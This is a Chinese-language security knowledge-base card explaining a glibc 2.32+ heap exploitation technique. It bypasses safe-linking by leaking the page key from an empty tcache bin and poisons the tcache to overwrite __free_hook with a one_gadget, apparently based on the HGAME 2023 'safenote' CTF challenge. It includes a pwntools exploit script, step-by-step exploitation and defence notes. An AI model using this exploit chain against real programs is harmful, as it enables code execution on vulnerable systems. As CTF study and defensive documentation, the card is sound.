---
id: binary-pwn-heap-glibc232-safe-linking-page-leak-freehook-onegadget
title: glibc 2.32+ safe-linking 下 tcache fd 劫持：空 bin 泄露页号重编码指针打 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: safe-linking-page-key-tcache-poison-freehook
tags:
- pwn
- heap
- glibc
- tcache
- safe-linking
- free-hook
- one-gadget
- ctf
cve: []
severity: high
confidence: high
affected_versions: glibc >= 2.32（safe-linking 生效；示例为 2.32-0ubuntu3_amd64，__free_hook 在 2.34+ 已移除）
status: draft
created: '2026-11-13'
updated: '2026-11-13'
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc232-safe-linking-page-leak-freehook-onegadget/
draft: false
kb_aliases:
- safe-linking 绕过
- safe-linking 页号泄露
- tcache fd 重新编码
- 空 tcache bin 泄露堆地址
- __free_hook one_gadget
- HGAME 2023 safenote
---

## 一句话结论

glibc 2.32+ 用 safe-linking 把 tcache/fastbin 的 `fd` 编码为 `(fd字段地址 >> 12) ^ next`；把一个 chunk 释放进空的 tcache bin 后，其 `fd` 恰好等于自身页号（裸密钥），`show` 读出后左移 12 位得到堆页基址，即可按同一公式重新编码任意目标地址（如 `__free_hook`），经两次 `malloc` 让 tcache 返回目标伪块并写入 one_gadget，随后 `free` 触发 `__free_hook` 取得 shell。

## 原理

- **safe-linking 公式**：glibc 2.32 起 tcache/fastbin 单链表指针改为 `PROTECT_PTR(pos, ptr) = ((size_t)pos >> 12) ^ ((size_t)ptr)`，其中 `pos` 是 `fd` 字段自身地址、`ptr` 是下一个空闲 chunk 地址；释放时 `tcache_put` 用该宏写入 `e->next`，分配时用 `REVEAL_PTR` 还原。它利用 ASLR 的 mmap_base 随机性作为密钥，使攻击者不知道 `pos >> 12` 时无法伪造 `fd`。
- **空 bin 首次释放泄露密钥**：tcache bin 为空时释放 chunk，`next = NULL`，写入的 `fd = (pos >> 12) ^ 0 = pos >> 12`——即 `fd` 字段所在 4KB 页的页号，直接明文可读。因为页内偏移只有 12 位且被移出，正常堆页号只占约 5 字节、其后为 `\x00`，`puts` 会在此截断，读 5 字节即可；`<<12` 还原页基址。
- **重编码任意目标**：要把 tcache 链头改到 `target`，需要让某个空闲 chunk 的 `next = target`，写入值必须是 `((&chunk_fd) >> 12) ^ target`。当待毒化的 chunk 与泄露 chunk 位于同一 4KB 页时两者页号相同，直接用泄露的页号作密钥即可；这正是 safe-linking 只是提高门槛而非修复漏洞的原因——一次堆泄露就能恢复密钥。
- **为什么目标选 `__free_hook`**：tcache 毒化只能让 `malloc` 返回任意地址。先让一次 `malloc` 返回 `__free_hook` 伪块并写入 one_gadget，再 `free` 任意 chunk，glibc 调用 `__free_hook(ptr, caller)` 即跳转执行。本例程序 Full RELRO + PIE，改 GOT 不可行，`__free_hook` 是当时版本（2.32）的经典落点。
- **libc 泄露的低字节截断问题**：本例用 0x80 请求（chunk 0x90），其尺寸超过默认 `global_max_fast=0x80`，在 tcache 装满 7 个后再 `free` 会进入 unsorted bin，用户区前 16 字节被写成 `fd/bk = main_arena+96`。该 libc 指针最低字节为 `0x00`，`puts` 打印会立即截断；先把 `fd` 最低字节改成非零（`edit(chunk, '\x11')`），再 `show` 就能打印到 `0x7f` 为止的 6 字节，按小端补全后减去偏移（`main_arena+96` 偏移 + `0x11` 的修正，示例为 `0x1e3c11`）得到 libc 基址。

## 触发条件

- 目标使用 glibc 2.32 及以上，tcache/fastbin 启用 safe-linking（2.34+ 已移除 `__free_hook`，需改用 `_IO_list_all`/`exit_funcs`/GOT 等落点）。
- 存在 UAF/悬空索引，能 `show` 已释放 chunk 的前 8 字节并 `edit` 其内容（本例 menufile 题：add/delete/edit/show）。
- 能连续分配/释放同尺寸 chunk，使目标尺寸的 tcache bin 先空后满；首次 free 用于泄密钥。
- 待毒化 chunk 的 `fd` 字段与泄露 chunk 的 `fd` 字段位于同一 4KB 页（否则页号不同，需精确 chunk 地址）。
- 能泄露 libc 基址并知道 `__free_hook` 与可用 one_gadget 的偏移；one_gadget 的执行约束（寄存器/栈）在触发点满足。

## 利用步骤

1. 申请 7 个 0x80 的 chunk（0-6）加两个备用（7、8），保证 0x90 的 tcache bin 初始为空。
2. `delete(0); show(0)`：读出空 bin 释放后的 `fd`（页号，遇 `\x00` 截断），`u64` 后左移 12 位得到堆页基址 `heap_page`。
3. `delete(1..6)` 把 0x90 tcache bin 填满（7/7）；再 `delete(7)`，0x90 超过 `global_max_fast`，chunk 进入 unsorted bin。
4. `edit(7, '\x11')` 把 unsorted bin `fd` 的最低字节 `0x00` 改为非零，`show(7)` 读到 `0x7f` 为止的 6 字节，`libc_base = leaked - 0x1e3c11`（偏移随 libc 版本调整）。
5. `pl = (heap_page >> 12) ^ (libc_base + __free_hook偏移)`，`edit(6, p64(pl))` 改写 tcache 中 chunk 6 的 `fd`。
6. `add(9, 0x80)` 消费 chunk 6；`add(10, 0x80)` 返回 `__free_hook` 伪块；`edit(10, p64(one_gadget))`。
7. `delete(0)` 触发 `free` → `__free_hook` 跳到 one_gadget → shell；可在本地用 `ld-2.32.so + LD_PRELOAD=libc-2.32.so` 复现。

## PoC

原文给出完整 exp（HGAME 2023 week3 safenote，libc 2.32），核心片段：

```python
for i in range(7):
    add(i, 0x80)
add(7, 0x80); add(8, 0x80)

delete(0); show(0)
heap_page = u64(p.recv(5)[-6:].ljust(8, b'\x00')) << 12   # fd = 页号

for i in range(1, 7):
    delete(i)
delete(7)                    # 0x90 > global_max_fast(0x80) -> unsorted bin

edit(7, '\x11')              # 绕过 fd 低字节 0x00 截断
show(7)
libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8, b'\x00')) - 0x1e3c11
free_hook = libc_base + libc.sym['__free_hook']
og = libc_base + 0xdf54f      # one_gadget 之一

pl = (heap_page >> 12) ^ free_hook
edit(6, p64(pl))

add(9, 0x80)                 # 返回 chunk6
add(10, 0x80)                # 返回 __free_hook 伪块
edit(10, p64(og))
delete(0)                    # free -> __free_hook(og) -> shell
```

```c
/* 机制核心：glibc 2.32 tcache_put */
e->key = tcache;
e->next = PROTECT_PTR(&e->next, tcache->entries[tc_idx]);  /* (pos>>12) ^ next */
```

说明：PoC 为原文 exp 的结构化摘录，未在本机复跑；`0x1e3c11`、`0xdf54f` 均为示例 libc 2.32 的偏移，换版本需重算。工程上更稳妥的 `heap_page` 读法是 recvuntil 非零字节或读满 8 字节再处理截断。

## 变体与关联

- **同页双 free 自异或**：连续释放两个同页 chunk，两次读 `fd` 异或即可还原第一个 chunk 的精确地址，不依赖独立堆泄露；与本卡“空 bin 单次泄露页号”互为补充，见 [[binary-pwn-heap-safe-linking-self-xor-heap-address]]。
- **fastbin 场景**：fastbin 的 `fd` 同样经 safe-linking 编码，公式一致；但只有尺寸 ≤ `global_max_fast`（默认 0x80）的 chunk 进 fastbin，且需考虑 fastbin 双 free 检查。
- **无 show 泄露**：可用 tcache stashing、largebin attack、`environ`/IO 链等替代泄露，再按本公式编码；堆块开到栈上的对齐细节见 [[binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack]]。
- **落点随版本迁移**：glibc 2.34+ 移除 `__free_hook`/`__malloc_hook`，常见替代为 `_IO_list_all`、`__exit_funcs`、`_rtld_global`、GOT（需 RELRO 允许）或 House of 系列；2.39 还要求 chunk 目标地址 0x10 对齐。
- **本地复现环境**：用 glibc-all-in-one 下载对应版本，`patchelf --set-interpreter`/`--replace-needed` 或 `process(['ld-2.32.so','./pwn'], env={'LD_PRELOAD':'./libc-2.32.so'})`，并把 `.debug` 目录交给 gdb；方法见 [[ctf-pwn-patchelf-local-glibc-dependency-pool]]。

## 检测与防御

- **根因仍是 UAF**：释放后置空指针、按索引校验 chunk 状态、禁止 show/edit 已释放块；safe-linking 与 tcache key 只是提高利用门槛。
- **堆完整性监控**：检测 tcache/fastbin `fd` 出现非堆范围值、`malloc` 返回 libc/栈地址、同一 chunk 被重复释放或重复 show 的调用序列；CTF 环境外可结合 glibc 的 `MALLOC_CHECK_`/tcache double-free 检查。
- **版本与控制流硬化**：升级到移除 hooks 的 glibc（2.34+）；启用 Full RELRO、PIE、Canary，减少可写函数指针落点；对 one_gadget 依赖的调用点约束可通过编译器/运行时缓解降低可利用性。
